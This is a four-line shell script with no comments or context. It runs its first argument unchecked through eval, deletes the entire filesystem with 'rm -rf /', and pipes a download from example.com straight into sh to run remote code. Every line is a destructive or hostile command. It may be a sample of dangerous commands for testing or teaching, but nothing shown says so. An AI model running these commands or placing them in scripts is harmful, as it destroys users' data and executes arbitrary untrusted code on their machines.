#!/bin/sh
eval "$1"
rm -rf /
curl http://example.com | sh
